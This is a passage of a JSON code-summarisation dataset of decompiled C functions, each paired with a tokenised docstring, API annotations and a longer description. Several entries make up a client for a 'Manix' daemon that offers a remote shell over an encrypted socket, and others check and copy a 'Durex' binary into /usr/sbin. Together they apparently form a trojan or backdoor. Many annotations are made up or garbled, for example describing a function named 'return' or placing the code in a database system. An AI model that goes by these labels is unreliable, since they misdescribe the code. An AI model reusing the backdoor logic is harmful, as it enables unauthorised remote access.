            "score",
            "based",
            "on",
            "the",
            "difference",
            "between",
            "two",
            "variables",
            ",",
            "and",
            "updating",
            "the",
            "screen",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "*",
            "v0",
            ";",
            "int",
            "v1",
            ";",
            "int",
            "*",
            "v2",
            ";",
            "int",
            "i",
            ";",
            "char",
            "spinner_chars",
            "[",
            "4",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v0",
            "=",
            "board",
            ";",
            "v1",
            "=",
            "2",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "do",
            "{",
            "v2",
            "=",
            "v0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "2",
            ";",
            "i",
            "!",
            "=",
            "52",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "if",
            "(",
            "*",
            "v2",
            ")",
            "{",
            "if",
            "(",
            "*",
            "v2",
            "<",
            "=",
            "0",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "spinner_chars",
            "=",
            "1546465148",
            ";",
            "if",
            "(",
            "wmove",
            "(",
            "stdscr",
            ",",
            "v1",
            ",",
            "i",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "waddch",
            "(",
            "stdscr",
            ",",
            "spinner_chars",
            "[",
            "abs32",
            "(",
            "*",
            "v2",
            "%",
            "4",
            ")",
            "]",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "wmove",
            "(",
            "stdscr",
            ",",
            "v1",
            ",",
            "i",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "{",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "97",
            "]",
            ")",
            ";",
            "}",
            "goto",
            "LABEL_6",
            ";",
            "}",
            "if",
            "(",
            "wmove",
            "(",
            "stdscr",
            ",",
            "v1",
            ",",
            "i",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "break",
            ";",
            "LABEL_6",
            ":",
            "+",
            "+",
            "i",
            ";",
            "+",
            "+",
            "v2",
            ";",
            "if",
            "(",
            "i",
            "=",
            "=",
            "52",
            ")",
            "goto",
            "LABEL_10",
            ";",
            "}",
            "+",
            "+",
            "v2",
            ";",
            "waddch",
            "(",
            "stdscr",
            ",",
            "0x20u",
            ")",
            ";",
            "}",
            "LABEL_10",
            ":",
            "v0",
            "+",
            "=",
            "50",
            ";",
            "+",
            "+",
            "v1",
            ";",
            "}",
            "while",
            "(",
            "v0",
            "!",
            "=",
            "&",
            "board",
            "[",
            "1250",
            "]",
            ")",
            ";",
            "mvprintw",
            "(",
            "0",
            ",",
            "43",
            ",",
            "\"Score %03d\\r\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "worm_length",
            "-",
            "4",
            ")",
            ")",
            ";",
            "wrefresh",
            "(",
            "stdscr",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a quadword (64 bits) from a specific offset in the FS segment register, which is often utilized in low-level programming for accessing thread-local storage or other system-specific data structures on x86 architecture.",
            "The \"addch\" function in the provided code snippets is part of the NCURSES library and is used to add a single character, specified by the given chtype, to the current position on the terminal screen with possible attributes like boldness or emphasis.",
            "The function `waddch` is part of the curses library in C and C++, allowing the addition of a single character, represented by the chtype datatype, to a specified window in a terminal-based user interface."
        ],
        "longer_label": "The provided code is a function in C that uses the NCURSES library to draw a game board on a terminal screen, including a spinning character represented by quadwords and updating the score display."
    },
    {
        "id": 136,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "establishes",
            "a",
            "connection",
            "loop",
            ",",
            "reading",
            "input",
            "from",
            "standard",
            "input",
            "and",
            "a",
            "socket",
            ",",
            "handling",
            "encryption",
            "and",
            "decryption",
            "of",
            "messages",
            ",",
            "and",
            "managing",
            "key",
            "exchanges",
            "for",
            "secure",
            "communication",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "v1",
            ";",
            "ssize_t",
            "n",
            ";",
            "ssize_t",
            "na",
            ";",
            "void",
            "*",
            "ptr",
            ";",
            "void",
            "*",
            "v5",
            ";",
            "void",
            "*",
            "v6",
            ";",
            "int",
            "v7",
            "[",
            "12",
            "]",
            ";",
            "__int64",
            "v8",
            ";",
            "int",
            "v9",
            ";",
            "fd_set",
            "readfds",
            ";",
            "__int64",
            "buf",
            "[",
            "512",
            "]",
            ";",
            "char",
            "s1",
            "[",
            "4104",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v13",
            ";",
            "v13",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "buf",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "buf",
            ")",
            ")",
            ";",
            "memset",
            "(",
            "s1",
            ",",
            "0",
            ",",
            "4096",
            ")",
            ";",
            "v1",
            "=",
            "0",
            ";",
            "ptr",
            "=",
            "0L",
            "L",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "do",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "memset",
            "(",
            "&",
            "readfds",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "readfds",
            ")",
            ")",
            ";",
            "readfds",
            ".",
            "fds_bits",
            "[",
            "0",
            "]",
            "|",
            "=",
            "1uL",
            "L",
            ";",
            "readfds",
            ".",
            "fds_bits",
            "[",
            "g_manix",
            "/",
            "64",
            "]",
            "|",
            "=",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "g_manix",
            "%",
            "64",
            ")",
            ";",
            "if",
            "(",
            "select",
            "(",
            "g_manix",
            "+",
            "1",
            ",",
            "&",
            "readfds",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "break",
            ";",
            "puts",
            "(",
            "\"Error: Select failed.\"",
            ")",
            ";",
            "}",
            "if",
            "(",
            "(",
            "readfds",
            ".",
            "fds_bits",
            "[",
            "0",
            "]",
            "&",
            "1",
            ")",
            "=",
            "=",
            "0",
            ")",
            "break",
            ";",
            "n",
            "=",
            "read",
            "(",
            "0",
            ",",
            "buf",
            ",",
            "0x3FFuL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "n",
            "<",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "ptr",
            ")",
            "free",
            "(",
            "ptr",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v13",
            ";",
            "}",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "buf",
            "+",
            "n",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "n",
            ">",
            "1",
            "&",
            "&",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "buf",
            "+",
            "n",
            "-",
            "1",
            ")",
            "=",
            "=",
            "10",
            ")",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "buf",
            "+",
            "-",
            "-",
            "n",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "buf",
            ",",
            "\"bye\"",
            ")",
            ")",
            "{",
            "if",
            "(",
            "ptr",
            ")",
            "free",
            "(",
            "ptr",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v13",
            ";",
            "}",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "buf",
            ",",
            "\"help\"",
            ")",
            ")",
            "{",
            "puts",
            "(",
            "\"\\\"help\\\"\\n    Display this help menu.\"",
            ")",
            ";",
            "puts",
            "(",
            "\"\\\"shell\\\"\\n    Spawn a remote shell. Type \\\"exit\\\" to quit the shell.\"",
            ")",
            ";",
            "puts",
            "(",
            "\"\\\"quit\\\"\\n    Stop the daemon.\"",
            ")",
            ";",
            "puts",
            "(",
            "\"\\\"bye\\\"\\n    Exit the client.\"",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "strempty",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "buf",
            ")",
            "&",
            "&",
            "LOBYTE",
            "(",
            "buf",
            "[",
            "0",
            "]",
            ")",
            "!",
            "=",
            "10",
            ")",
            "{",
            "if",
            "(",
            "v1",
            "=",
            "=",
            "1",
            "&",
            "&",
            "v9",
            "=",
            "=",
            "1",
            ")",
            "{",
            "if",
            "(",
            "!",
            "ptr",
            ")",
            "{",
            "ptr",
            "=",
            "malloc",
            "(",
            "0xB3B0uL",
            "L",
            ")",
            ";",
            "rijn_init",
            "(",
            "ptr",
            ",",
            "v8",
            ")",
            ";",
            "}",
            "v6",
            "=",
            "(",
            "void",
            "*",
            ")",
            "rijn_build_encrypt",
            "(",
            "ptr",
            ",",
            "buf",
            ")",
            ";",
            "if",
            "(",
            "send",
            "(",
            "g_manix",
            ",",
            "v6",
            ",",
            "n",
            "+",
            "16",
            "-",
            "n",
            "%",
            "16",
            ",",
            "0",
            ")",
            "<",
            "=",
            "0",
            ")",
            "puts",
            "(",
            "\"Error: Unable to send message.\"",
            ")",
            ";",
            "usleep",
            "(",
            "0xC350u",
            ")",
            ";",
            "if",
            "(",
            "v6",
            ")",
            "free",
            "(",
            "v6",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "send",
            "(",
            "g_manix",
            ",",
            "buf",
            ",",
            "n",
            ",",
            "0",
            ")",
            "<",
            "=",
            "0",
            ")",
            "{",
            "puts",
            "(",
            "\"Error: Unable to send message.\"",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "strcmp",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "buf",
            ",",
            "\"quit\"",
            ")",
            "&",
            "&",
            "v1",
            "=",
            "=",
            "1",
            ")",
            "goto",
            "LABEL_33",
            ";",
            "}",
            "}",
            "while",
            "(",
            "(",
            "readfds",
            ".",
            "fds_bits",
            "[",
            "g_manix",
            "/",
            "64",
            "]",
            "&",
            "(",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "g_manix",
            "%",
            "64",
            ")",
            ")",
            ")",
            "=",
            "=",
            "0",
            ")",
            ";",
            "v7",
            "[",
            "0",
            "]",
            "=",
            "g_manix",
            ";",
            "na",
            "=",
            "recv",
            "(",
            "g_manix",
            ",",
            "s1",
            ",",
            "0x401uL",
            "L",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "na",
            "<",
            "=",
            "0",
            ")",
            "break",
            ";",
            "if",
            "(",
            "v1",
            "!",
            "=",
            "1",
            "|",
            "|",
            "v9",
            "!",
            "=",
            "1",
            ")",
            "goto",
            "LABEL_42",
            ";",
            "if",
            "(",
            "!",
            "ptr",
            ")",
            "{",
            "ptr",
            "=",
            "malloc",
            "(",
            "0xB3B0uL",
            "L",
            ")",
            ";",
            "rijn_init",
            "(",
            "ptr",
            ",",
            "v8",
            ")",
            ";",
            "}",
            "s1",
            "[",
            "na",
            "]",
            "=",
            "0",
            ";",
            "v5",
            "=",
            "(",
            "void",
            "*",
            ")",
            "rijn_build_decrypt",
            "(",
            "ptr",
            ",",
            "s1",
            ")",
            ";",
            "if",
            "(",
            "v5",
            ")",
            "{",
            "memset",
            "(",
            "s1",
            ",",
            "0",
            ",",
            "4095",
            ")",
            ";",
            "write",
            "(",
            "1",
            ",",
            "v5",
            ",",
            "na",
            ")",
            ";",
            "free",
            "(",
            "v5",
            ")",
            ";",
            "LABEL_42",
            ":",
            "s1",
            "[",
            "na",
            "]",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "v1",
            "&",
            "&",
            "!",
            "v9",
            ")",
            "write",
            "(",
            "1",
            ",",
            "s1",
            ",",
            "na",
            ")",
            ";",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "s1",
            ",",
            "\"Access granted\\n\"",
            ")",
            ")",
            "{",
            "v1",
            "=",
            "1",
            ";",
            "write",
            "(",
            "1",
            ",",
            "s1",
            ",",
            "na",
            ")",
            ";",
            "puts",
            "(",
            "\"Generating exchange keys...\"",
            ")",
            ";",
            "init_key",
            "(",
            "v7",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v1",
            "=",
            "=",
            "1",
            "&",
            "&",
            "!",
            "v9",
            "&",
            "&",
            "(",
            "unsigned",
            "int",
            ")",
            "key_exchange",
            "(",
            "v7",
            ",",
            "s1",
            ")",
            "=",
            "=",
            "-",
            "2",
            ")",
            "{",
            "puts",
            "(",
            "\"Error during the exchange of keys\"",
            ")",
            ";",
            "if",
            "(",
            "ptr",
            ")",
            "free",
            "(",
            "ptr",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v13",
            ";",
            "}",
            "if",
            "(",
            "v1",
            "=",
            "=",
            "1",
            "&",
            "&",
            "v9",
            "=",
            "=",
            "1",
            "&",
            "&",
            "na",
            "!",
            "=",
            "1025",
            ")",
            "LABEL_33",
            ":",
            "write",
            "(",
            "1",
            ",",
            "\"Manix$ \"",
            ",",
            "7uL",
            "L",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "!",
            "na",
            ")",
            "break",
            ";",
            "puts",
            "(",
            "\"Error: Unable to read message.\"",
            ")",
            ";",
            "}",
            "puts",
            "(",
            "\"Daemon socket connection lost...\"",
            ")",
            ";",
            "if",
            "(",
            "ptr",
            ")",
            "free",
            "(",
            "ptr",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v13",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__readfsqword` function is used to read an unsigned 64-bit integer from a specific offset within the FS segment register, primarily utilized in low-level system programming for accessing thread information or other system data structures on x86 architectures.",
            "The function `memset` is being defined and utilized within the provided code snippets to initialize a block of memory with a specified value, typically used for zeroing out memory or setting it to a specific byte pattern, in a custom C library implementation.",
            "The function \"return\" likely aims to provide a unified way of returning values from different contexts, such as computing distance fields in graphics or managing interception devices, facilitating organized code and potentially aiding in error handling and abstraction.",
            "The function \"qword\" likely deals with handling and manipulating quadruple words (64-bit integers) in a programming context, with the given code snippets possibly demonstrating operations or implementations related to this data type."
        ],
        "longer_label": "The provided code implements a connection loop function in C, utilizing low-level system functions such as `__readfsqword` for accessing thread information, `memset` for memory initialization, and `select` for managing socket I/O, with annotations explaining the usage of these functions within the context of system programming."
    },
    {
        "id": 137,
        "docstring_tokens": [
            "The",
            "function",
            "disconnects",
            "the",
            "host",
            "if",
            "there",
            "is",
            "an",
            "open",
            "socket",
            "connection",
            "and",
            "closes",
            "the",
            "socket",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "result",
            ";",
            "result",
            "=",
            "g_manix",
            ";",
            "if",
            "(",
            "g_manix",
            "!",
            "=",
            "-",
            "1",
            ")",
            "{",
            "puts",
            "(",
            "\"Closing client socket...\"",
            ")",
            ";",
            "puts",
            "(",
            "\"Exiting client...\"",
            ")",
            ";",
            "return",
            "close",
            "(",
            "g_manix",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `osing` appears to be part of a larger program dealing with parsing INI-style configuration files and performing resource cleanup, likely within a database management system, by freeing allocated memory and closing file descriptors associated with a pager structure.",
            "The function named `return` appears to be a placeholder or marker in the context of showcasing code snippets from different parts of a program or library, possibly for educational or illustrative purposes, rather than an actual function with specific functionality."
        ],
        "longer_label": "The provided code snippet appears to be a function named `disconnect_host` intended to close a client socket and exit a client in a larger program, possibly related to managing resources within a database system, with an annotation suggesting its context within parsing INI-style configuration files and performing resource cleanup."
    },
    {
        "id": 138,
        "docstring_tokens": [
            "The",
            "resolve_host",
            "function",
            "resolves",
            "the",
            "host",
            "specified",
            "by",
            "machine",
            "to",
            "obtain",
            "the",
            "IP",
            "address",
            "and",
            "port",
            "number",
            ",",
            "storing",
            "it",
            "in",
            "the",
            "sockaddr_in",
            "structure",
            "pointed",
            "to",
            "by",
            "sockin",
            ",",
            "and",
            "returns",
            "0",
            "if",
            "successful",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "_QWORD",
            "*",
            "a2",
            ")",
            "{",
            "sockaddr",
            "*",
            "ai_addr",
            ";",
            "__int64",
            "v3",
            ";",
            "struct",
            "addrinfo",
            "*",
            "i",
            ";",
            "unsigned",
            "int",
            "v6",
            ";",
            "struct",
            "addrinfo",
            "*",
            "pai",
            ";",
            "struct",
            "addrinfo",
            "req",
            ";",
            "unsigned",
            "__int64",
            "v9",
            ";",
            "v9",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v6",
            "=",
            "-",
            "1",
            ";",
            "req",
            ".",
            "ai_flags",
            "=",
            "0",
            ";",
            "req",
            ".",
            "ai_family",
            "=",
            "2",
            ";",
            "req",
            ".",
            "ai_socktype",
            "=",
            "0",
            ";",
            "req",
            ".",
            "ai_protocol",
            "=",
            "6",
            ";",
            "req",
            ".",
            "ai_addrlen",
            "=",
            "0",
            ";",
            "memset",
            "(",
            "&",
            "req",
            ".",
            "ai_addr",
            ",",
            "0",
            ",",
            "24",
            ")",
            ";",
            "if",
            "(",
            "!",
            "getaddrinfo",
            "(",
            "a1",
            ",",
            "0L",
            "L",
            ",",
            "&",
            "req",
            ",",
            "&",
            "pai",
            ")",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "pai",
            ";",
            "i",
            ";",
            "i",
            "=",
            "i",
            "-",
            ">",
            "ai_next",
            ")",
            "{",
            "if",
            "(",
            "i",
            "-",
            ">",
            "ai_family",
            "=",
            "=",
            "2",
            ")",
            "{",
            "ai_addr",
            "=",
            "i",
            "-",
            ">",
            "ai_addr",
            ";",
            "v3",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "ai_addr",
            "-",
            ">",
            "sa_data",
            "[",
            "6",
            "]",
            ";",
            "*",
            "a2",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "ai_addr",
            "-",
            ">",
            "sa_family",
            ";",
            "a2",
            "[",
            "1",
            "]",
            "=",
            "v3",
            ";",
            "v6",
            "=",
            "0",
            ";",
            "break",
            ";",
            "}",
            "}",
            "freeaddrinfo",
            "(",
            "pai",
            ")",
            ";",
            "}",
            "return",
            "v6",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `memset` is used to fill a block of memory with a particular value, typically used for initializing memory to zero or another constant value, and it appears to be implemented in different ways across various code snippets provided, possibly tailored for specific platforms or requirements."
        ],
        "longer_label": "The provided code is a function `resolve_host` which resolves a host name to an IPv4 address, setting up a socket address structure and populating it with the resolved address, while utilizing `memset` for memory initialization and `getaddrinfo` for obtaining address information, but contains a potential bug where `if (i->ai_family == 2)` should be `if (i->ai_family == AF_INET)`."
    },
    {
        "id": 139,
        "docstring_tokens": [
            "The",
            "code",
            "establishes",
            "a",
            "connection",
            "to",
            "a",
            "host",
            "using",
            "a",
            "specified",
            "machine",
            "and",
            "port",
            "number",
            ",",
            "displaying",
            "informative",
            "messages",
            "and",
            "handling",
            "errors",
            "along",
            "the",
            "way",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ")",
            "{",
            "uint16_t",
            "v3",
            ";",
            "int",
            "fd",
            ";",
            "struct",
            "sockaddr",
            "addr",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "printf",
            "(",
            "\"Connecting client to %s:%s...\\n\"",
            ",",
            "a1",
            ",",
            "a2",
            ")",
            ";",
            "puts",
            "(",
            "\"Creating client socket...\"",
            ")",
            ";",
            "fd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "6",
            ")",
            ";",
            "if",
            "(",
            "fd",
            ">",
            "=",
            "0",
            ")",
            "{",
            "puts",
            "(",
            "\"Socket created.\"",
            ")",
            ";",
            "puts",
            "(",
            "\"Resolving host...\"",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "resolve_host",
            "(",
            "a1",
            ",",
            "&",
            "addr",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "puts",
            "(",
            "\"Error: Failed to resolve host.\"",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"Host resolved.\"",
            ")",
            ";",
            "puts",
            "(",
            "\"Connecting to host...\"",
            ")",
            ";",
            "addr",
            ".",
            "sa_family",
            "=",
            "2",
            ";",
            "v3",
            "=",
            "atoi",
            "(",
            "a2",
            ")",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "addr",
            ".",
            "sa_data",
            "=",
            "htons",
            "(",
            "v3",
            ")",
            ";",
            "if",
            "(",
            "connect",
            "(",
            "fd",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ">",
            "=",
            "0",
            ")",
            "{",
            "puts",
            "(",
            "\"Connected to host.\"",
            ")",
            ";",
            "g_manix",
            "=",
            "fd",
            ";",
            "puts",
            "(",
            "\"Welcome ! Type \\\"help\\\" to see available commands.\"",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"Error: Failed to connect to host.\"",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"Error: Failed to create TCP socket.\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read an unsigned 64-bit integer value from the FS segment at the specified offset, primarily utilized in low-level system programming for accessing thread information or other specialized data structures on x86 architectures.",
            "The `printf` function in the provided code snippets is used to format and output text to the standard output (usually the console) in the C programming language."
        ],
        "longer_label": "The given code defines a function `connect_host` which attempts to create a TCP socket, resolve a host, connect to it, and returns either a file descriptor upon successful connection or an error code if any step fails, utilizing low-level system functions and standard C output functions for logging."
    },
    {
        "id": 140,
        "docstring_tokens": [
            "The",
            "code",
            "sets",
            "up",
            "a",
            "signal",
            "handler",
            "for",
            "SIGINT",
            ",",
            "checks",
            "the",
            "number",
            "of",
            "command",
            "line",
            "arguments",
            ",",
            "connects",
            "to",
            "a",
            "default",
            "host",
            "and",
            "port",
            "if",
            "no",
            "arguments",
            "are",
            "provided",
            ",",
            "connects",
            "to",
            "a",
            "specified",
            "host",
            "and",
            "port",
            "if",
            "two",
            "arguments",
            "are",
            "provided",
            ",",
            "displays",
            "usage",
            "information",
            "if",
            "an",
            "incorrect",
            "number",
            "of",
            "arguments",
            "are",
            "provided",
            ",",
            "enters",
            "a",
            "connection",
            "loop",
            ",",
            "and",
            "then",
            "disconnects",
            "from",
            "the",
            "host",
            "before",
            "returning",
            "0",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "signal",
            "(",
            "2",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "if",
            "(",
            "argc",
            "=",
            "=",
            "1",
            ")",
            "{",
            "puts",
            "(",
            "\"Using default connection settings.\"",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "connect_host",
            "(",
            "\"127.0.0.1\"",
            ",",
            "\"4242\"",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "LABEL_3",
            ":",
            "puts",
            "(",
            "\"Exiting client...\"",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "}",
            "else",
            "{",
            "if",
            "(",
            "argc",
            "!",
            "=",
            "3",
            ")",
            "{",
            "printf",
            "(",
            "\"Usage: %s <machine> <port>\\n\"",
            ",",
            "*",
            "argv",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "connect_host",
            "(",
            "argv",
            "[",
            "1",
            "]",
            ",",
            "argv",
            "[",
            "2",
            "]",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "goto",
            "LABEL_3",
            ";",
            "}",
            "connection_loop",
            "(",
            ")",
            ";",
            "disconnect_host",
            "(",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `signal` function in the provided code snippets is likely being used to register signal handlers for specific signals in the context of concurrent programming or signal handling in C programs.",
            "The `printf` function in the provided code snippets seems to be a custom implementation or alias for the standard C `printf` function, possibly utilized in a project involving a Reverse Polish Notation (RPN) calculator and formatting considerations across different systems.",
            "The `connect` function likely facilitates establishing a connection to a serial port device or a network socket, handling operations such as opening, closing, and setting options, as well as error handling and retries for network connections.",
            "The function `connection_loopdisconnect_host` likely serves to repeatedly attempt disconnection from a host within a loop until successful, although the code snippets are absent, indicating a disconnect mechanism possibly used in network or server management."
        ],
        "longer_label": "The provided code likely sets up signal handlers for interrupt signals, establishes connections using custom connection functions with error handling, and facilitates a client program that can connect to a specified host and port or use default settings."
    },
    {
        "id": 141,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "the",
            "path",
            "of",
            "the",
            "current",
            "executable",
            "and",
            "compares",
            "it",
            "to",
            "a",
            "target",
            "file",
            ",",
            "exiting",
            "with",
            "an",
            "error",
            "if",
            "the",
            "paths",
            "do",
            "not",
            "match",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "unsigned",
            "int",
            "v0",
            ";",
            "char",
            "s",
            "[",
            "8",
            "]",
            ";",
            "__int64",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "char",
            "buf",
            "[",
            "8",
            "]",
            ";",
            "__int64",
            "v7",
            ";",
            "char",
            "v8",
            "[",
            "496",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v9",
            ";",
            "v9",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "s",
            "=",
            "0L",
            "L",
            ";",
            "v3",
            "=",
            "0L",
            "L",
            ";",
            "v4",
            "=",
            "0L",
            "L",
            ";",
            "v5",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "buf",
            "=",
            "0L",
            "L",
            ";",
            "v7",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "v8",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "v8",
            ")",
            ")",
            ";",
            "v0",
            "=",
            "getpid",
            "(",
            ")",
            ";",
            "sprintf",
            "(",
            "s",
            ",",
            "\"/proc/%d/exe\"",
            ",",
            "v0",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Checking current executable path...\"",
            ")",
            ";",
            "if",
            "(",
            "readlink",
            "(",
            "s",
            ",",
            "buf",
            ",",
            "0x200uL",
            "L",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to retreive path. Exiting.\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "buf",
            ")",
            ";",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "\"/usr/sbin/Durex\"",
            ",",
            "buf",
            ")",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "else",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __readfsq is used to read the value of the FS segment register and retrieve a 64-bit value.",
            "The function `getpid()` appears to be repeatedly declared across multiple code snippets, potentially due to porting or compatibility issues, but its purpose is likely to retrieve the process ID of the current process."
        ],
        "longer_label": "The provided code defines a function `checkpath()` which retrieves the current executable path, compares it with \"/usr/sbin/Durex\", and returns a specific value depending on the comparison result, utilizing system calls like `readlink()` and `getpid()` alongside low-level memory access functions."
    },
    {
        "id": 142,
        "docstring_tokens": [
            "The",
            "code",
            "replicates",
            "a",
            "binary",
            "file",
            "called",
            "Durex",
            "to",
            "a",
            "target",
            "file",
            ",",
            "checking",
            "for",
            "existing",
            "files",
            "and",
            "ensuring",
            "a",
